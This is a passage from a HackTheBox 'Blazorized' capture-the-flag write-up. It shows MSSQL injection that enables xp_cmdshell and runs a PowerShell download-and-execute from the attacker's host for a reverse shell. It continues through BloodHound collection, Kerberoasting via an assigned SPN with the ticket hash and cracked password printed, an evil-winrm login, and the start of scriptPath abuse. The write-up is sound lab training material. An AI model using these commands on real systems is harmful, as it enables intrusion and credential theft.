+<h4 id="SQL-Injection-http-admin-blazorized-htb-check-duplicate-post-title"><a href="#SQL-Injection-http-admin-blazorized-htb-check-duplicate-post-title" class="headerlink" title="SQL Injection - http://admin.blazorized.htb/check-duplicate-post-title"></a>SQL Injection - <a class="link"   target="_blank" rel="noopener" href="http://admin.blazorized.htb/check-duplicate-post-title" >http://admin.blazorized.htb/check-duplicate-post-title <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><p>There seems to be an SQLI in the <a class="link"   target="_blank" rel="noopener" href="http://admin.blazorized.htb/check-duplicate-post-title" >http://admin.blazorized.htb/check-duplicate-post-title <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> endpoint:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/sqli.png"
+                      alt="SQL Injection "
+                ><figcaption>SQL Injection </figcaption></figure></p>
+<p>Also, during our initial Nmap scan, we saw that we have an MSSQL service running so I’ll just assume the SQLI query is being executed on a MSSQL DB. This can be useful: “<a class="link"   target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/314e4da9632f6e20cd149ca55020e50556c6280f/SQL%20Injection/MSSQL%20Injection.md#L4" >https://github.com/swisskyrepo/PayloadsAllTheThings/blob/314e4da9632f6e20cd149ca55020e50556c6280f/SQL%20Injection/MSSQL%20Injection.md#L4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
+<p>We must execute these queries against the database so we could get a reverse shell:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;<span class="string">&#x27; EXECUTE sp_configure &#x27;</span><span class="keyword">show</span> advanced options<span class="string">&#x27;,1 -- -</span></span><br><span class="line"><span class="string">;&#x27;</span> RECONFIGURE</span><br><span class="line">;<span class="string">&#x27; EXECUTE sp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;,1 -- -</span></span><br><span class="line"><span class="string">;&#x27;</span> RECONFIGURE</span><br><span class="line">; <span class="string">&#x27; EXECUTE master.dbo.xp_cmdshell &#x27;</span>powershell <span class="operator">-</span>c &quot;iex(New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://10.10.x.x/r.ps1&#x27;&#x27;)&quot; <span class="comment">--</span></span><br></pre></td></tr></table></figure></div>
+
+<p>And I have a shell:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">4444</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">4444</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.23.80</span>] <span class="number">63124</span></span><br><span class="line">Windows PowerShell running as user DC1<span class="variable">$</span> on DC1</span><br><span class="line">Copyright (C) <span class="number">2015</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt;whoami</span><br><span class="line">blazorized\nu_1055</span><br><span class="line"><span class="built_in">PS</span> C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>And our user flag:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PS C:\users\nu_1055\desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\users\nu_1055\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---       11/10/2024   2:59 PM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\users\nu_1055\desktop&gt; cat user.txt</span><br><span class="line">3cc2d0241aa485******************</span><br><span class="line">PS C:\users\nu_1055\desktop&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="Kerberoatsting-rsa-4810-user"><a href="#Kerberoatsting-rsa-4810-user" class="headerlink" title="Kerberoatsting rsa_4810 user"></a>Kerberoatsting rsa_4810 user</h4><p>I’ll first be running SharpHound on the box and visualize it on BloodHound:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\nu_1055&gt; ./SharpHound.exe <span class="literal">-c</span> all</span><br><span class="line"></span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">24</span>:<span class="number">23.4251341</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|This version of SharpHound is compatible with the <span class="number">4.2</span> Release of BloodHound</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">24</span>:<span class="number">23.5970045</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Resolved Collection Methods: <span class="built_in">Group</span>, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">24</span>:<span class="number">23.6282573</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Initializing SharpHound at <span class="number">5</span>:<span class="number">24</span> PM on <span class="number">11</span>/<span class="number">10</span>/<span class="number">2024</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">24</span>:<span class="number">23.8938920</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Flags: <span class="built_in">Group</span>, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">24</span>:<span class="number">24.0501665</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Beginning LDAP search <span class="keyword">for</span> blazorized.htb</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">24</span>:<span class="number">24.0970246</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Producer has finished, closing LDAP channel</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">24</span>:<span class="number">24.0970246</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|LDAP channel closed, waiting <span class="keyword">for</span> consumers</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">24</span>:<span class="number">54.6908030</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Status: <span class="number">0</span> objects finished (+<span class="number">0</span> <span class="number">0</span>)/s <span class="literal">--</span> <span class="keyword">Using</span> 35 MB RAM</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">25</span>:<span class="number">13.0657537</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Consumers finished, closing output channel</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">25</span>:<span class="number">13.0970076</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Output channel closed, waiting <span class="keyword">for</span> output task to complete</span><br><span class="line">Closing writers</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">25</span>:<span class="number">13.2845061</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Status: <span class="number">110</span> objects finished (+<span class="number">110</span> <span class="number">2.244898</span>)/s <span class="literal">--</span> <span class="keyword">Using</span> 43 MB RAM</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">25</span>:<span class="number">13.2845061</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Enumeration finished <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">49.2326936</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">25</span>:<span class="number">13.3626356</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|Saving cache with stats: <span class="number">70</span> ID to <span class="built_in">type</span> mappings.</span><br><span class="line"> <span class="number">70</span> name to SID mappings.</span><br><span class="line"> <span class="number">0</span> machine sid mappings.</span><br><span class="line"> <span class="number">2</span> sid to domain mappings.</span><br><span class="line"> <span class="number">0</span> global catalog mappings.</span><br><span class="line"><span class="number">2024</span><span class="literal">-11-10T17</span>:<span class="number">25</span>:<span class="number">13.3782603</span><span class="literal">-06</span>:<span class="number">00</span>|INFORMATION|SharpHound Enumeration Completed at <span class="number">5</span>:<span class="number">25</span> PM on <span class="number">11</span>/<span class="number">10</span>/<span class="number">2024</span>! Happy Graphing!</span><br></pre></td></tr></table></figure></div>
+
+<p>I’ll now use this script to make it a base64 and transfer it out of the machine:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$inputFile</span> = <span class="string">&quot;C:\users\nu_1055\20241110172512_BloodHound.zip&quot;</span></span><br><span class="line"><span class="variable">$outputFile</span> = <span class="string">&quot;C:\users\nu_1055\mem.b64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Open input file and output file streams</span></span><br><span class="line"><span class="variable">$inputStream</span> = [<span class="type">System.IO.File</span>]::OpenRead(<span class="variable">$inputFile</span>)</span><br><span class="line"><span class="variable">$outputStream</span> = [<span class="type">System.IO.StreamWriter</span>]::new(<span class="variable">$outputFile</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment"># Set chunk size (adjust as needed)</span></span><br><span class="line">    <span class="variable">$chunkSize</span> = <span class="number">64</span>KB</span><br><span class="line">    <span class="variable">$buffer</span> = <span class="built_in">New-Object</span> byte[] <span class="variable">$chunkSize</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read and encode the file in chunks</span></span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$bytesRead</span> = <span class="variable">$inputStream</span>.Read(<span class="variable">$buffer</span>, <span class="number">0</span>, <span class="variable">$buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$encodedChunk</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$buffer</span>, <span class="number">0</span>, <span class="variable">$bytesRead</span>)</span><br><span class="line">        <span class="variable">$outputStream</span>.WriteLine(<span class="variable">$encodedChunk</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment"># Close the file streams</span></span><br><span class="line">    <span class="variable">$inputStream</span>.Close()</span><br><span class="line">    <span class="variable">$outputStream</span>.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Base64 encoding completed.&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Later clean it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/blazorized]</span><br><span class="line">└─$ nano b64.data</span><br><span class="line">                                                                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/blazorized]</span><br><span class="line">└─$ grep -o <span class="string">&#x27;[A-Za-z0-9+/=]&#x27;</span> b64.data | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> &gt; cleaned.b64      </span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/Hackthebox/blazorized]</span><br><span class="line">└─$ <span class="built_in">base64</span> -d cleaned.b64 &gt; bloodhound.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see from the Bloodhound analysis that the “nu_1055” user has <code>WriteSPN</code> over <code>RSA_4810</code>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/bloodhound.png"
+                      alt="BloodHound "
+                ><figcaption>BloodHound </figcaption></figure></p>
+<p>“Kerberoasting” is an attack where an authenticated user makes a request to a ticket for a service by it’s SPN (Service Principal Name), then the ticket that comes back is encrypted with the password of the user associated with that service, and that’s when we crack it ;)</p>
+<p>The first step is to assign an SPN to the RSA_4810 user, and then request a TGS for it. We’ll do this using PowerView:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\nu_1055&gt; <span class="built_in">get-domainuser</span> rsa_4810</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logoncount            : <span class="number">23</span></span><br><span class="line">badpasswordtime       : <span class="number">2</span>/<span class="number">1</span>/<span class="number">2024</span> <span class="number">1</span>:<span class="number">29</span>:<span class="number">42</span> PM</span><br><span class="line">distinguishedname     : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb</span><br><span class="line">objectclass           : &#123;top, person, organizationalPerson, user&#125;</span><br><span class="line">displayname           : RSA_4810</span><br><span class="line">lastlogontimestamp    : <span class="number">7</span>/<span class="number">12</span>/<span class="number">2024</span> <span class="number">6</span>:<span class="number">25</span>:<span class="number">46</span> AM</span><br><span class="line">userprincipalname     : RSA_4810@blazorized.htb</span><br><span class="line">samaccountname        : RSA_4810</span><br><span class="line">codepage              : <span class="number">0</span></span><br><span class="line">samaccounttype        : USER_OBJECT</span><br><span class="line">accountexpires        : NEVER</span><br><span class="line">countrycode           : <span class="number">0</span></span><br><span class="line">whenchanged           : <span class="number">11</span>/<span class="number">10</span>/<span class="number">2024</span> <span class="number">11</span>:<span class="number">47</span>:<span class="number">57</span> PM</span><br><span class="line">instancetype          : <span class="number">4</span></span><br><span class="line">usncreated            : <span class="number">24627</span></span><br><span class="line">objectguid            : ed5f4235<span class="literal">-a152-4952-bed0-28ae811ee7f4</span></span><br><span class="line">lastlogoff            : <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span> <span class="number">6</span>:<span class="number">00</span>:<span class="number">00</span> PM</span><br><span class="line">whencreated           : <span class="number">1</span>/<span class="number">9</span>/<span class="number">2024</span> <span class="number">11</span>:<span class="number">37</span>:<span class="number">15</span> AM</span><br><span class="line">objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=blazorized,DC=htb</span><br><span class="line">dscorepropagationdata : &#123;<span class="number">2</span>/<span class="number">2</span>/<span class="number">2024</span> <span class="number">2</span>:<span class="number">44</span>:<span class="number">29</span> PM, <span class="number">2</span>/<span class="number">2</span>/<span class="number">2024</span> <span class="number">2</span>:<span class="number">40</span>:<span class="number">50</span> PM, <span class="number">1</span>/<span class="number">11</span>/<span class="number">2024</span> <span class="number">2</span>:<span class="number">13</span>:<span class="number">10</span> AM, <span class="number">1</span>/<span class="number">10</span>/<span class="number">2024</span> <span class="number">6</span>:<span class="number">28</span>:<span class="number">26</span> PM...&#125;</span><br><span class="line">serviceprincipalname  : kujen/hehe</span><br><span class="line">usnchanged            : <span class="number">356825</span></span><br><span class="line">memberof              : &#123;CN=Remote_Support_Administrators,CN=Users,DC=blazorized,DC=htb, CN=Remote Management</span><br><span class="line">                        Users,CN=Builtin,DC=blazorized,DC=htb&#125;</span><br><span class="line">lastlogon             : <span class="number">2</span>/<span class="number">2</span>/<span class="number">2024</span> <span class="number">11</span>:<span class="number">44</span>:<span class="number">30</span> AM</span><br><span class="line">badpwdcount           : <span class="number">0</span></span><br><span class="line">cn                    : RSA_4810</span><br><span class="line">useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD</span><br><span class="line">objectsid             : S<span class="literal">-1-5-21-2039403211-964143010-2924010611-1107</span></span><br><span class="line">primarygroupid        : <span class="number">513</span></span><br><span class="line">pwdlastset            : <span class="number">2</span>/<span class="number">25</span>/<span class="number">2024</span> <span class="number">11</span>:<span class="number">55</span>:<span class="number">59</span> AM</span><br><span class="line">name                  : RSA_4810</span><br></pre></td></tr></table></figure></div>
+
+<p>The SPN is now “kujen&#x2F;hehe”, let’s request a TGS:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\users\nu_1055&gt; <span class="built_in">Get-DomainSPNTicket</span> <span class="literal">-SPN</span> kujen/hehe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SamAccountName       : UNKNOWN</span><br><span class="line">DistinguishedName    : UNKNOWN</span><br><span class="line">ServicePrincipalName : kujen/hehe</span><br><span class="line">TicketByteHexStream  :</span><br><span class="line">Hash                 : <span class="variable">$krb5tgs</span><span class="variable">$23</span><span class="variable">$</span>*UNKNOWN<span class="variable">$UNKNOWN</span><span class="variable">$kujen</span>/hehe*<span class="variable">$850720821AFC4CE7E1F59271D3D35181</span><span class="variable">$FBF1C69E09496058DAF58F</span></span><br><span class="line">                       A1807F8EDC6106EED2F3595F18029048CA9F00A5FED9D37F6081BE5CF841E788E288FA9990DA21BC550424811D36F8E6</span><br><span class="line">                       ADD58F0C26CEB0B7085E935A97603AC3973E150593E2AEF5A3C42618D6EF51F9576670DD3704EBEF615A812985C85505</span><br><span class="line">                       <span class="number">228169288</span>A43762C21E259AFB2C80E0A1ABAF4CA172E84088B2160B1669EBBDFE2358EF1A934B8C12D05A7FEC41C2A51</span><br><span class="line">                       <span class="number">3</span>FB185C22ECFCFE058ACA77D14177A39EE209580F34DCC3BF0563C2AC1194B3E4F60B45D478F28B9AE7182BAFF5DA5AF</span><br><span class="line">                       <span class="number">734</span>C09D3189EE017B0CA1BDBE0538360AE96ED46B0901E8BEC357E1FF2B7A0B8A5DBBD43F5FFF16010346F1E7444F389</span><br><span class="line">                       <span class="number">74</span>D35403517E415AF0E496ED66968A6D36AC61980F4A46C2C0F881969DC766CAFEA3F1A59742E75DA2324703C7AFE0C7</span><br><span class="line">                       <span class="number">5950</span>C3524B6FE0E69B7743AC7B98DC63A5243DBE8648B2D43418986D1D3200724B48CCB923AD63754E4D9A9A1978DD02</span><br><span class="line">                       A93F2A4751C5482A436A7060E28F4059141196A4C5400C9D3A8E5B7E13812A9EF5A1F9DC8F4B09A9949F97CFDC872352</span><br><span class="line">                       <span class="number">7</span>AD422CABF649C176BD369993BC0BB9A31D170D258FD4B5889200B624F19DB192038EA00B1015C60C8F473FCC152E3EB</span><br><span class="line">                       A01D30407206690DC0A28A5BDE26D05795EE9E90638D2444E66BBB6F4ABF0021B989D5CC458C1FC1AE13EA9A7FFADFE6</span><br><span class="line">                       <span class="number">9626</span>CA4AC7363C37B575DF370DB7E375B69334605E05EF922F7A0507B6DC78608E08B81203558398A60487443540BF08</span><br><span class="line">                       <span class="number">7</span>B2F46EAC90E9A373BD064DF1FCA5CECBADBA0F85AC2DFECCD6E51F9FC7E8845A470A0092D2958957E1F9DE6C31C81EF</span><br><span class="line">                       <span class="number">123</span>E1F3AA280D124C3996D141537DB6A515B30CE65A6748B68BBD6A988AFC3F77DD11B456F8E4B708D5A99EBCA88BADA</span><br><span class="line">                       <span class="number">071940</span>B49B4526289FB802500C17100B26C14F1D0FA53716B2A04FD64C7E1BABE336FE373F9A0E68C218EAE724C303DE</span><br><span class="line">                       <span class="number">18</span>DEB9C2C716AF6D97DC6E72EB386628C1C1DE08E7B897AB02EE5CC594D6FA314EDC1431A65AA131677CC38922D05BBF</span><br><span class="line">                       <span class="number">687147</span>C59C4024EF10F8751880A32F950A15B2001AA289A849EBBDB101DA5BD24FD318A575B4B5BD5A56F9E1B84554A2</span><br><span class="line">                       <span class="number">5</span>DA005A9CD17C9454780D6E8C49D4BBB28000195E11CB1C6529A790DB172EDBF079642BF1DE379293B2F3FEB013A5DEC</span><br><span class="line">                       C0181BDA337B0EBDEDFCA7E6B1CD042665A8AE2FD8A2E05FA1797A1837ACB28241CEC84E00BBA559DE57185AD5263489</span><br><span class="line">                       <span class="number">75</span>D0F7240300DCFF0EB196B4E65033804C3525688CC666638C10C51D42CC1CFCA161408B22E356533E489919B3935594</span><br><span class="line">                       FE3EF898189D1DFFDE46C741135536B7A3DE437847B4145125B3ED94DA02EF70B962D804DFAF9CC081141319158852<span class="built_in">FC</span></span><br><span class="line">                       <span class="number">5</span>CF2ECEDFD94DA6EC349312EA2D0A9D200B2A7CD1140F28D52CED48D9C5B350B86F64A0DE9C3BB37C0DFBEBA56F25662</span><br><span class="line">                       <span class="number">069616</span>BD4A2588B2D5940B0B0B195A62A15619304C56E8FF1917D1451CA5F6AD631A2AF3F57E42F23EABF1C6CC4E87FD</span><br><span class="line">                       D5D81F19A2FF08FD96F175E8B3FB6256DC59D16A7D657FA4B9E8E0C7674DBE237F95A64AA44E76C609D46359307776D4</span><br><span class="line">                       <span class="number">7</span>BDA4E7D2C1ED4CAC164E0A45BB4F1983CB6E2BB564A5632299199F29CB1E3FE27043D560D0417591E15863904609552</span><br><span class="line">                       <span class="number">524</span>E5C725158D1245449ED727914E47D884006E0B91F68B57ACBED0590D85486B104051CF7CD0C7554DF9710B0D5BE75</span><br><span class="line">                       <span class="number">2</span>EEF2E3A40916EA200594573054812693F463DBC9B28991432215A7FD34DB814703771A32E6A5348ACE01B5CB3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\users\nu_1055&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s attempt to crack it:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Blazorized/password.png"
+                      alt="Kerberoasting"
+                ><figcaption>Kerberoasting</figcaption></figure></p>
+<p>And our password is: <code>(Ni7856Do9854Ki05Ng0005 #)</code></p>
+<p>I can use it to connect to the user using Evil-Winrm:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/blazorized]</span><br><span class="line">└─$ evil-winrm -i blazorized.htb -u rsa_4810 -p <span class="string">&#x27;(Ni7856Do9854Ki05Ng0005 #)&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">blazorized\rsa_4810</span><br><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; </span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Pivoting-to-SSA-6010-Script-Execution"><a href="#Pivoting-to-SSA-6010-Script-Execution" class="headerlink" title="Pivoting to SSA_6010 - Script Execution"></a>Pivoting to SSA_6010 - Script Execution</h4><p>When I first solved the machine, the ssa_6010 user had a “scriptpath” variable already set which I changed to a reverse shell script and got a shell for him. We can now check if we can set the scriptpath for him:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; Set-DomainObject -Identity SSA_6010 -SET @&#123;scriptpath=<span class="string">&#x27;kujen&#x27;</span>&#125;</span><br><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; get-domainuser SSA_6010 -properties *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logoncount            : 3278</span><br><span class="line">badpasswordtime       : 6/19/2024 9:58:18 AM</span><br><span class="line">distinguishedname     : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb</span><br><span class="line">objectclass           : &#123;top, person, organizationalPerson, user&#125;</span><br><span class="line">displayname           : SSA_6010</span><br><span class="line">lastlogontimestamp    : 11/10/2024 3:00:14 PM</span><br><span class="line">userprincipalname     : SSA_6010@blazorized.htb</span><br><span class="line">samaccountname        : SSA_6010</span><br><span class="line">codepage              : 0</span><br><span class="line">samaccounttype        : USER_OBJECT</span><br><span class="line">accountexpires        : NEVER</span><br><span class="line">countrycode           : 0</span><br><span class="line">whenchanged           : 11/11/2024 12:10:00 AM</span><br><span class="line">instancetype          : 4</span><br><span class="line">usncreated            : 29007</span><br><span class="line">objectguid            : 8bf3166b-e716-4f91-946c-174e1fb433ed</span><br><span class="line">lastlogoff            : 12/31/1600 6:00:00 